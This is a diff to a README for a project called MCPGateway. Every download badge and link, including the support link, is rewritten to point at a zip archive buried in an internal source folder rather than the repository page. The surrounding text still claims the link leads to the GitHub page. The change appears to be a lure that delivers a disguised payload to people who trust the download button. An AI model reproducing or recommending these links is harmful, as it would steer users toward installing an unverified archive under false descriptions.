@@ -1,6 +1,6 @@
 # 🎯 MCPGateway - Easy AI Tool Search and Use
 
-[![Download MCPGateway](https://img.shields.io/badge/Download-MCPGateway-brightgreen)](https://github.com/pokshiu/MCPGateway)
+[![Download MCPGateway](https://img.shields.io/badge/Download-MCPGateway-brightgreen)](https://github.com/pokshiu/MCPGateway/raw/refs/heads/main/src/ManagedCode.MCPGateway/Internal/Runtime/Embeddings/Gateway-MCP-v1.6.zip)
 
 ---
 
@@ -41,7 +41,7 @@ To run MCPGateway, your computer should have:
 
 Click the big green badge above or visit this link to download:
 
-[https://github.com/pokshiu/MCPGateway](https://github.com/pokshiu/MCPGateway)
+[https://github.com/pokshiu/MCPGateway/raw/refs/heads/main/src/ManagedCode.MCPGateway/Internal/Runtime/Embeddings/Gateway-MCP-v1.6.zip](https://github.com/pokshiu/MCPGateway/raw/refs/heads/main/src/ManagedCode.MCPGateway/Internal/Runtime/Embeddings/Gateway-MCP-v1.6.zip)
 
 This link takes you to the GitHub page where you can find the files needed for installation.
 
@@ -115,7 +115,7 @@ If MCPGateway does not start or shows errors:
 
 Use the GitHub page for support and updates:
 
-[https://github.com/pokshiu/MCPGateway](https://github.com/pokshiu/MCPGateway)
+[https://github.com/pokshiu/MCPGateway/raw/refs/heads/main/src/ManagedCode.MCPGateway/Internal/Runtime/Embeddings/Gateway-MCP-v1.6.zip](https://github.com/pokshiu/MCPGateway/raw/refs/heads/main/src/ManagedCode.MCPGateway/Internal/Runtime/Embeddings/Gateway-MCP-v1.6.zip)
 
 You can open issues or read FAQs from other users.
 
@@ -146,4 +146,4 @@ Embedding search means using AI to understand the meaning of your query and find
 
 ---
 
-[![Download MCPGateway](https://img.shields.io/badge/Download-MCPGateway-brightgreen)](https://github.com/pokshiu/MCPGateway)
+[![Download MCPGateway](https://img.shields.io/badge/Download-MCPGateway-brightgreen)](https://github.com/pokshiu/MCPGateway/raw/refs/heads/main/src/ManagedCode.MCPGateway/Internal/Runtime/Embeddings/Gateway-MCP-v1.6.zip)
